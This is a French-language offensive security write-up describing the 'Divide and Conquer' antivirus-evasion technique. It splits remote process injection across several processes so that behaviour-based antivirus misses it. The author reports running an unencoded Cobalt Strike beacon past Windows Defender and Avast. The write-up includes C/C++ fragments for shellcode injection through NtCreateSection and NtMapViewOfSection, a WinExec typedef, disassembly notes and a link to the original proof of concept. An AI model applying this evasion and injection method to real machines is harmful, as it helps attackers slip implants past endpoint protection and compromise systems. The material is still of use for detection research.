# Divide and Conquer

auteur: @RistBS, 2022

La technique “**Divide and Conquer**” va permettre à un attaquant de contourner les AV basé sur de l’analyse comportementale (la quasi totalité) en divisant les actions malveillantes et les API calls en processus distincts, en plusieurs étapes.
Puisque la détection repose sur la détection des API calls dans un processus, Nous allons injecter un code dans un processus distant en deux étapes (ou plus).

L'AV verra 2 processus différents, tous deux ne faisant qu'une partie de l'injection, mais aucun d'entre eux n'effectue la totalité de l'opération. Donc, s'il y a une opération qui implique plusieurs appels d'API, et que nous pouvons la diviser, nous pourrons bypass l’AV.

voici les Fonctions de Win API que nous allons utiliser :

*1ère étape du processus:*

- **CreateProcessA**
- **VirtualAlloc**
- **WriteProcessMemory**
- **CreateProcessA**

*2ème étape du processus:*

- **OpenProcess**
- **CreateRemoteThread**

voici un un code modifié du PoC original ou je me suis permis d’injecter un Beacon tout fraichement généré de cobalt strike sans encodage XOR ou autres ni crypter AES ou autres types de chiffrements.

![Untitled](Divide%20and%2066e87/Untitled.png)

![Analyse de la techniques dans un gestionnaires de tâches.](Divide%20and%2066e87/Untitled%201.png)

Analyse de la techniques dans un gestionnaires de tâches.

### **Analyse de la Technique (***mode gros barbu activé***):**

ici on peut voir les fonctions utilisé dans cette technique:

![Untitled](Divide%20and%2066e87/Untitled%202.png)

**CreateProcessA:**

![Untitled](Divide%20and%2066e87/Untitled%203.png)

on peut voir que pour indiquer l’adresse d’une variable dan ce cas de figure, on utilises 2 instructions

```c
lea     rax, [stack_frame]
mov     qword ptr [stack_frame], rax 
```

l’élément clé de cette technique,  c’est la condition qui s’execute à l’adresse `0x00007ff68352180c` qui va permettre à la technique de prendre forme en divisant l’éxecutions d’API en plusieurs processus.

![Untitled](Divide%20and%2066e87/Untitled%204.png)

on jump à l’adresse `00007ff6a7e11975`

![Untitled](Divide%20and%2066e87/Untitled%205.png)

### **Execution**

![Untitled](Divide%20and%2066e87/Untitled%206.png)

et comme vous pouvez le voir j’ai une connexion en retour, j’ai pu lancer le payload sans problème alors que j’ai Windows Defender ainsi que Avast d’actif.

Le premier PoC a été réalisé par **Csaba Fitzl,** le voici **:** [https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd](https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd)

### Ajouts Supplémentaire du PoC original

**1 : une définition de WinExec utilisé pour qu'il puisse être appelé à partir de la fonction injectée.**

```cpp
typedef int(WINAPI* myWinExec)(
				LPCSTR lpCmdLine,
				UINT   uCmdShow
	);
```

**2 : tous les paramètres de données qui seront nécessaires pour la fonction injectée, par exemple : noms de fonctions, paramètres, etc...**

```cpp
struct PARAMETERS {
			SIZE_T FuncInj;
			char command[256];
};
```

**3 : structure pour stocker les informations relatives à l'injection, le PID et l'adresse de la fonction.**

```cpp
typedef struct INJECTINFO
{
			DWORD pid;
			LPVOID address;
} *LPINJECTINFO;
```

enfin, nous créons une section de mémoire, une vue de la section de mémoire dans le processus local et une vue de la section de mémoire dans le processus cible, on calcule la taille de notre fonction d'injection puis on copie le shellcode dans fNtMapViewOfSection() locale, qui sera reflétée dans fNtMapViewOfSection() du processus cible.

```cpp
fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)& sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

SIZE_T size_myFunc = (SIZE_T)Useless - (SIZE_T)ToBeInjected;
memcpy(localSectionAddress, &data, sizeof(data));
```
